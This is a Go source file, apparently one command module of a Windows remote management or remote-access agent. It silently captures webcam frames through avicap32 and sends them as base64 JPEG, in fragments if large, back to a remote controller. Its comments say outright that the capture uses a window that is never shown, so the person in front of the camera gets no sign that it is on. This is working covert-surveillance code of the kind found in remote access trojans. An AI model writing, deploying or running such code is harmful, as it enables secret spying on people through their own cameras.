//go:build windows

package commands

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// Remote camera via Video-for-Windows (avicap32, present on every Windows):
// open driver 0, grab one frame to the clipboard as DIB, parse pixels,
// return data-URL JPEG. No dependencies, no visible window (capture window
// is WS_POPUP, never shown).

var (
	modAvicap32  = syscall.NewLazyDLL("avicap32.dll")
	modUser32Cam = syscall.NewLazyDLL("user32.dll")
	modKern32Cam = syscall.NewLazyDLL("kernel32.dll")

	procCapCreate = modAvicap32.NewProc("capCreateCaptureWindowA")
	procSendMsgA  = modUser32Cam.NewProc("SendMessageA")
	procDestroyW  = modUser32Cam.NewProc("DestroyWindow")
	procOpenClip  = modUser32Cam.NewProc("OpenClipboard")
	procCloseClip = modUser32Cam.NewProc("CloseClipboard")
	procGetClip   = modUser32Cam.NewProc("GetClipboardData")
	procGlobLock  = modKern32Cam.NewProc("GlobalLock")
	procGlobUnlock = modKern32Cam.NewProc("GlobalUnlock")
	procGlobSize  = modKern32Cam.NewProc("GlobalSize")
)

const (
	wmCapDriverConnect    = 0x40A
	wmCapDriverDisconnect = 0x40B
	wmCapEditCopy         = 0x41E
	wmCapGrabFrame        = 0x43C
	cfDIB                 = 8
	wsPopup               = 0x80000000
)

func capSend(hwnd, msg, w, l uintptr) uintptr {
	r, _, _ := procSendMsgA.Call(hwnd, msg, w, l)
	return r
}

// cameraMu serializes captures: the global clipboard + VFW driver race
// when concurrent shots overlap (each command spawns a goroutine).
var cameraMu sync.Mutex

// captureCameraJPEG grabs one frame at roughly maxW wide, JPEG quality q.
func captureCameraJPEG(dev, maxW, q int) ([]byte, error) {
	cameraMu.Lock()
	defer cameraMu.Unlock()
	name, _ := syscall.BytePtrFromString("RMM")
	hwnd, _, _ := procCapCreate.Call(
		uintptr(unsafe.Pointer(name)), wsPopup, 0, 0, 320, 240, 0, 0)
	if hwnd == 0 {
		return nil, fmt.Errorf("no camera (capture window failed)")
	}
	defer procDestroyW.Call(hwnd)
	if capSend(hwnd, wmCapDriverConnect, uintptr(dev), 0) == 0 {
		return nil, fmt.Errorf("no camera (driver %d connect failed — in use or absent)", dev)
	}
	defer capSend(hwnd, wmCapDriverDisconnect, 0, 0)
	capSend(hwnd, wmCapGrabFrame, 0, 0)
	capSend(hwnd, wmCapEditCopy, 0, 0)
	// The clipboard is global: another app may hold it briefly. Retry
	// instead of failing the whole shot on first contention.
	var r uintptr
	for i := 0; i < 3; i++ {
		r, _, _ = procOpenClip.Call(0)
		if r != 0 {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if r == 0 {
		return nil, fmt.Errorf("no camera (clipboard open failed)")
	}
	defer procCloseClip.Call()
	h, _, _ := procGetClip.Call(cfDIB)
	if h == 0 {
		return nil, fmt.Errorf("no camera (empty frame)")
	}
	sz, _, _ := procGlobSize.Call(h)
	if sz == 0 || sz > 100<<20 {
		return nil, fmt.Errorf("no camera (bad frame size)")
	}
	ptr, _, _ := procGlobLock.Call(h)
	if ptr == 0 {
		return nil, fmt.Errorf("no camera (lock failed)")
	}
	defer procGlobUnlock.Call(h)
	raw := (*[1 << 30]byte)(unsafe.Pointer(ptr))[:int(sz):int(sz)]
	img, err := dibToImage(raw)
	if err != nil {
		return nil, err
	}
	// Downscale to maxW preserving aspect (box average straight on RGBA
	// pixels: no per-pixel interface dispatch like the old At/Set loop,
	// and smoother than nearest-neighbor).
	if scaled := scaleRGBABox(img, maxW); scaled != nil {
		img = scaled
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: q}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// dibToImage parses a CF_DIB blob (BITMAPINFOHEADER + pixels, 24/32-bit).
func dibToImage(raw []byte) (image.Image, error) {
	if len(raw) < 40 {
		return nil, fmt.Errorf("DIB too small")
	}
	u32 := func(o int) uint32 {
		return uint32(raw[o]) | uint32(raw[o+1])<<8 | uint32(raw[o+2])<<16 | uint32(raw[o+3])<<24
	}
	i32 := func(o int) int32 { return int32(u32(o)) }
	if u32(0) < 40 {
		return nil, fmt.Errorf("unsupported DIB header")
	}
	w, h := int(i32(4)), int(i32(8))
	bpp := int(uint32(raw[14]) | uint32(raw[15])<<8)
	if w <= 0 || h == 0 || w > 8192 || h > 8192 || h < -8192 {
		return nil, fmt.Errorf("bad DIB dims")
	}
	topDown := false
	if h < 0 {
		topDown = true
		h = -h
	}
	off := int(u32(0))
	if off < 40 || off > len(raw) {
		return nil, fmt.Errorf("bad DIB offset")
	}
	dst := image.NewRGBA(image.Rect(0, 0, w, h))
	switch bpp {
	case 24:
		stride := (w*3 + 3) &^ 3
		if off+stride*h > len(raw) {
			return nil, fmt.Errorf("DIB truncated")
		}
		for y := 0; y < h; y++ {
			sy := y
			if !topDown {
				sy = h - 1 - y
			}
			row := raw[off+sy*stride:]
			for x := 0; x < w; x++ {
				dst.SetRGBA(x, y, colorRGBA(row[x*3+2], row[x*3+1], row[x*3]))
			}
		}
	case 32:
		stride := w * 4
		if off+stride*h > len(raw) {
			return nil, fmt.Errorf("DIB truncated")
		}
		for y := 0; y < h; y++ {
			sy := y
			if !topDown {
				sy = h - 1 - y
			}
			row := raw[off+sy*stride:]
			for x := 0; x < w; x++ {
				dst.SetRGBA(x, y, colorRGBA(row[x*4+2], row[x*4+1], row[x*4]))
			}
		}
	default:
		return nil, fmt.Errorf("unsupported DIB depth %d", bpp)
	}
	return dst, nil
}

func colorRGBA(r, g, b byte) color.RGBA { return color.RGBA{r, g, b, 0xff} }

// scaleRGBABox downscales src to maxW wide preserving aspect, or returns
// nil when no scaling is needed (or the image isn't addressable RGBA).
func scaleRGBABox(img image.Image, maxW int) image.Image {
	src, ok := img.(*image.RGBA)
	if !ok {
		return nil
	}
	b := src.Bounds()
	w, hh := b.Dx(), b.Dy()
	if w <= maxW || w <= 0 {
		return nil
	}
	nh := hh * maxW / w
	if nh < 1 {
		nh = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, maxW, nh))
	for y := 0; y < nh; y++ {
		y0 := (y * hh) / nh
		y1 := ((y + 1) * hh) / nh
		if y1 <= y0 {
			y1 = y0 + 1
		}
		for x := 0; x < maxW; x++ {
			x0 := (x * w) / maxW
			x1 := ((x + 1) * w) / maxW
			if x1 <= x0 {
				x1 = x0 + 1
			}
			var r, g, bl, a uint32
			n := uint32(0)
			for sy := y0; sy < y1; sy++ {
				ro := src.PixOffset(b.Min.X, b.Min.Y+sy)
				for sx := x0; sx < x1; sx++ {
					i := ro + (sx-b.Min.X)*4
					r += uint32(src.Pix[i])
					g += uint32(src.Pix[i+1])
					bl += uint32(src.Pix[i+2])
					a += uint32(src.Pix[i+3])
					n++
				}
			}
			j := dst.PixOffset(x, y)
			dst.Pix[j] = uint8(r / n)
			dst.Pix[j+1] = uint8(g / n)
			dst.Pix[j+2] = uint8(bl / n)
			dst.Pix[j+3] = uint8(a / n)
		}
	}
	return dst
}

// cameraFragChars caps one CAMFRAG slice (~96KB b64): small enough for a
// single QoS0 publish with envelope headroom, big enough to keep frag
// counts low.
const cameraFragChars = 96 * 1024

// cameraShot implements: camera-shot [device 0-3] [quality 1-100] [maxW].
// Returns a data-URL JPEG (UI sniffs the prefix into the camera tab/modal).
// Frames whose data-URL exceeds one QoS0-friendly publish are split into
// CAMFRAG <id> <seq>/<total> lines the controller reassembles; small
// frames return inline exactly like before.
func cameraShot(args string) (string, error) {
	dev, q, maxW := 0, 60, 640
	fields := strings.Fields(strings.TrimSpace(args))
	if len(fields) >= 1 {
		if v, err := strconv.Atoi(fields[0]); err == nil && v >= 0 && v <= 3 {
			dev = v
		} else if len(fields) == 1 {
			// single arg is quality for backwards compat
			if v, err := strconv.Atoi(fields[0]); err == nil && v >= 1 && v <= 100 {
				q = v
				dev = 0
			}
		}
	}
	if len(fields) >= 2 {
		if v, err := strconv.Atoi(fields[1]); err == nil && v >= 1 && v <= 100 {
			q = v
		}
	}
	if len(fields) >= 3 {
		if v, err := strconv.Atoi(fields[2]); err == nil && v >= 160 && v <= 1280 {
			maxW = v
		}
	}
	jpg, err := captureCameraJPEG(dev, maxW, q)
	if err != nil {
		return "", err
	}
	url := "data:image/jpeg;base64," + base64.StdEncoding.EncodeToString(jpg)
	if len(url) <= cameraFragChars {
		return url, nil
	}
	if len(url) > 900*1024 {
		return "", fmt.Errorf("frame too large (%dKB) — lower quality/width", len(url)/1024)
	}
	var sb strings.Builder
	fragID := time.Now().UnixNano()
	total := (len(url) + cameraFragChars - 1) / cameraFragChars
	for i := 0; i < total; i++ {
		end := (i + 1) * cameraFragChars
		if end > len(url) {
			end = len(url)
		}
		fmt.Fprintf(&sb, "CAMFRAG %d %d/%d %s\n", fragID, i, total, url[i*cameraFragChars:end])
	}
	return strings.TrimRight(sb.String(), "\n"), nil
}
